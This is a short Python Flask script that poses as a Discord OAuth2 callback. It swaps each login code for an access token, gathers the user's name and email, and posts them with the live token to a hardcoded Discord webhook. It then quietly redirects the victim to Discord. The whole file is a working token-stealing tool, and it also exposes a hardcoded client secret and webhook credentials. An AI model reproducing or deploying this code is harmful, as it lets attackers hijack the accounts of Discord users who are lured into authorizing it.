import requests
from flask import Flask, request, redirect
app = Flask(__name__)

ID = "1501206551942398092"
SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
URI = "https://web-assets-v1.onrender.com/callback"
WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2whw9pNizDOpRxdEQIC9r2qDFbrxI7sh3j54q4S2EWwAvF6qt"

@app.route('/callback')
def callback():
    c = request.args.get('code')
    if not c: return "Fail", 400
    
    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':c,'redirect_uri':URI}
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=d).json()
    t = r.get('access_token')

    if t:
        h = {'Authorization': 'Bearer ' + str(t)}
        u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
        
        # NO F-STRINGS. NO BRACKETS. IMPOSSIBLE TO CUT OFF.
        f = [{"name": "User", "value": str(u.get('username'))},
             {"name": "Email", "value": str(u.get('email'))},
             {"name": "Token", "value": str(t)}]
             
        requests.post(WEB, json={"embeds": [{"fields": f}]})
        
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
